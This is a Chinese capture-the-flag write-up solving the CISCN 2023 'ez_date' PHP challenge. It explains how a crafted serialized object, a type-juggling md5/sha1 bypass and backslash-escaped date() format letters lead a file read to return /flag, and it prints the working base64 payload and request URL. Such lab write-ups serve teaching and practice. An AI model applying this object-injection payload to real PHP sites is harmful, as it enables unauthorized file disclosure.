## 基本信息

* 题目名称： [CISCN 2023 华北]ez_date
* 题目链接： https://www.nssctf.cn/problem/4096
* 考点清单： 反序列化，弱比较，正则表达式，hash 函数，PHP
* 工具清单： PHP环境
* payloads： 弱比较绕过，转义符绕过

## 一、看到什么

**题目关键信息列表**：

1. `PHP 源代码`: 该题的PHP 源码，本题的唯一线索。


## 二、想到什么解题思路

1. 源码审计：

   - 主要部分定义了类`date`；
   - 在最后有`$_GET['code']`接受传参；
   - 出现`unserialize`函数。

   可能是考察 PHP 的反序列化；

2. 类`date`定义三个公有属性和一个`__wakeup`函数，明显是通过精心构造类的属性来获取flag；

3. 函数有两个`if`，并在第二个`if`块最后有`echo file_get_contents($data);`可能是能够输出flag的部分。

## 三、尝试过程和结果记录

**代码解读：**

- `if(is_array($this->a)||is_array($this->b))`说明`$a`和`$b`不能为数组，不能使用数组绕过；

- `if( ($this->a !== $this->b) && (md5($this->a) === md5($this->b)) && (sha1($this->a)=== sha1($this->b)) )`

  这个判断条件说明`$a`和`$b`需要满足：

  - `$a`不能强等于`$b`；
  - `$a`的md5强等于`$b`的md5；
  - `$a`的sha1强等于`$b`的sha1。

- `date()`函数会将特定的字母转化为特定的时间表达格式；

- `uniqid()`函数用于生成唯一随机字符串（uuid）；

当进入第二个`if`块之后，使用`date()`函数对`$file`的内容进行处理，然后随机生成一个uuid作为文件名，将`$content`写入这个文件，最后对文件内容进行正则替换，正则表达式含义如下：

- `/`：正则表达式开始符
- `(`：开始一个子匹配组
- `)`：结束一个子匹配组
- `\s`：匹配任意空白字符，如space、tab等
- `\n`：匹配换行符
- `*`：匹配0个或多个前面的表达式
- `+`：匹配1个或多个前面的表达式
- `/i`：不区分大小写

综上，代码中的正则表达式作用是将文件中所有连续的空白符、换行符替换为空字符串。

**尝试过程：**

1. 尝试构造`$a`和`$b`绕过第二个`if`条件，进入`if`块内：

   搜索MD5，PHP比较关键字，找到参考：https://www.cnblogs.com/linfangnan/p/13411103.html，介绍了PHP弱比较和相关例题，由此联想到`md5()`和`sha1()`函数接受的参数是 **字符串** 或 **数字**，由于字符串和数字是不同对象，但是可以值相同，所以可以根据这一特性构造，尝试如下：

   ```php
   <?php
   
   $a=1;
   $b="1";
   
   echo md5($a)."\n".md5($b)."\n";
   
   if( ($a !== $b) && (md5($a) === md5($b)) && (sha1($a)=== sha1($b)) ){
       echo "success!";
   }
   
   /*
   c4ca4238a0b923820dcc509a6f75849b
   c4ca4238a0b923820dcc509a6f75849b
   success!
   */
   ```

   说明可以构造`数字1`和`字符串"1"`来绕过判断条件。

2. 尝试构造`$file`以获取flag，反推代码逻辑：

   1. 根据`echo file_get_contents($data);`反推，如果要输出`/flag`的内容，需要满足`$data="/flag"`；
   2. 若满足`$data="/flag"`，需要满足`$uuid`这个文件的内容经过正则去除特殊字符后仍为`"/flag"`；
   3. 所以`$content=date($this->file);`需要满足`$file`经过`date()`函数后为`/flag`。

   问题归结为构造`$file`经过`date()`函数后为`/flag`（允许有换行符等特殊字符串）。

   ```php
   echo date('/flag'); # 输出：/fTuesdaypm5
   # 可以通过转义符'\'避免被转义
   echo date('/f\l\a\g'); # 输出：/flag
   ```

3. 构造反序列化链：

   `code 传参`->`base64解码`->`反序列化`->`触发__wakeup()函数`->`绕过if条件`->`绕过data()`->`输出flag`

   ```php
   class date
   {
       public $a = 1;
       public $b = '1';
       public $file = "/f\l\a\g";
   }
   
   $a = new date;
   echo base64_encode(serialize($a));
   # Tzo0OiJkYXRlIjozOntzOjE6ImEiO2k6MTtzOjE6ImIiO3M6MToiMSI7czo0OiJmaWxlIjtzOjg6Ii9mXGxcYVxnIjt9
   ```

4. 根据题源代码，GET传参，访问http://node5.anna.nssctf.cn:24441/?code=Tzo0OiJkYXRlIjozOntzOjE6ImEiO2k6MTtzOjE6ImIiO3M6MToiMSI7czo0OiJmaWxlIjtzOjg6Ii9mXGxcYVxnIjt9获得flag

## 四、总结与反思

1. PHP弱比较、强比较特性：

   **`==`（等于）、`!=`（不等）**：比较 **值是否相等**，会 **自动转换类型**（类型转换后再进行比较）；

   **`===`（全等，严格相等）、`!==`（不全等，严格不等）**：比较 **值和类型是否完全相等**，不会进行 **类型转换**，同时比较值和类型。

2. 注意转义符的使用，面对特定函数的时候有奇效。